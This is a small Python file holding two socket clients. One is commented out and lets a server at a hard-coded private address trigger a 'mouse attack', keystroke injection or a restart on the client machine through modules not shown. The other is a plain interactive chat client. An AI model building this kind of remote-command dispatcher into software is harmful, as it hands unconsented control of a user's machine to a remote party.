# import socket
# import MouseControl , KeyStrokes , Restart


# def start_client():
#     # Create a socket object
#     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
#     # Define server IP address and port
#     host = '172.20.10.7'
#     port = 12310
    
#     # Connect to the server
#     client_socket.connect((host, port))
    
#     while True:
        
#         # Send a message to the server
#         client_message = input("Client: ")
#         client_socket.send(client_message.encode('utf-8'))
        
#         if client_message.lower() == 'exit':
#             print("Closing connection")
#             break
        
#         # Receive response from the server
#         server_message = client_socket.recv(1024).decode('utf-8')
#         if server_message.lower() == 'exit':
#             print("Server closed the connection")
#             break
        
#         if server_message == '1':
#             MouseControl.mouse_attack()
        
#         if server_message == '2':
#             Restart.restart()
        
#         if server_message == '3':
#             KeyStrokes.KeyStrokes()
        
#         else:
#             pass
#         print(f"Server: {server_message}")

#     # Close the client socket
#     client_socket.close()

# if __name__ == "__main__":
#     start_client()

import socket
ClientMultiSocket = socket.socket()
host = '172.20.10.15'
port = 6001
print('Waiting for connection response')
try:
    ClientMultiSocket.connect((host, port))
except socket.error as e:
    print(str(e))
res = ClientMultiSocket.recv(1024)
while True:
    Input = input('Hey there: ')
    ClientMultiSocket.send(str.encode(Input))
    res = ClientMultiSocket.recv(1024)
    print(res.decode('utf-8'))
ClientMultiSocket.close()